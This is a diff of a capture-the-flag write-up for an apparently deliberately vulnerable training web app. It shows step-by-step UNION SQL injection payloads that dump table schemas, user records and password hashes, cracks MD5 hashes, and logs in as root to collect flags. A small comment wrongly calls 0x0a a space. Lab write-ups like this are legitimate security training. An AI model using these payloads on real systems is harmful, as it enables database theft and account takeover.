@@ -119,8 +119,9 @@ We can use this: `1 or 1=1 UNION SELECT table_schema, table_name FROM informatio
 `1 or 1=1 UNION SELECT NULL,group_concat(column_name, 0x0a) FROM information_schema.columns where table_name = 0x7573657273`
 >user_id,first_name,last_name,town,country,planet,Commentaire,countersign
 
+(0x0a is hex for space, just for readability)
 
-1 or 1=1 UNION SELECT NULL,group_concat(town,country,planet,Commentaire,countersign) from users
+`1 or 1=1 UNION SELECT NULL,group_concat(town,country,planet,Commentaire,countersign) from users`
 >First name: 
 Surname : Honolulu AmericaEARTHAmerca !2b3366bcfd44f540e630d4dc2b9b06d9,BerlinAllemagneEarthIch spreche kein Deutsch.60e9032c586fb422e2c16dee6286cf10,MoscouRussiaEarth????? ????????????? ?????????e083b24a01c483437bcf4a9eea7c1b4d,424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
 
@@ -141,4 +142,50 @@ Sha256 on fortytwo -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6
 Flag: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
 
 ---
-1 or 1=1 UNION SELECT NULL,group_concat(column_name, 0x0a) FROM information_schema.columns where table_name = 0x64625f64656661756c74
+Search image SQL injection
+
+`1 or 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables`
+There is a `list_images` table on the database as well
+
+>list_images -> hex = 0x6c6973745f696d61676573
+
+`1 or 1=1 UNION SELECT NULL,group_concat(column_name) FROM information_schema.columns where table_name = 0x6c6973745f696d61676573`
+
+We get the tables used for images:
+>id,url,title,comment
+
+`1 or 1=1 UNION SELECT NULL,group_concat(id,url,title,0x0a,comment) from list_images`
+
+One of the comments is 
+>If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+
+>1928e8083cf461a51303633093573c46 MD5 decoded -> albatroz
+
+>sha256 on albatroz -> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+
+Flag: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+
+---
+
+db_default SQL Injection
+
+`1 or 1=1 UNION SELECT NULL,group_concat(column_name) FROM information_schema.columns where table_name = 0x64625f64656661756c74`
+
+>id,username,password
+
+Member_Brute_Force
+db_default
+
+`1 or 1=1 UNION SELECT NULL,group_concat(id,0x0a,username,0x0a,password) from Member_Brute_Force.db_default`
+
+>1
+root
+3bf1114a986ba87ed28fc1b5884fc2f8,2
+admin
+3bf1114a986ba87ed28fc1b5884fc2f8
+
+>3bf1114a986ba87ed28fc1b5884fc2f8 MD5 decoded -> shadow
+
+Sign in with root:shadow or admin:shadow from link on main page or {ip}/?page=signin
+
+Flag: b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
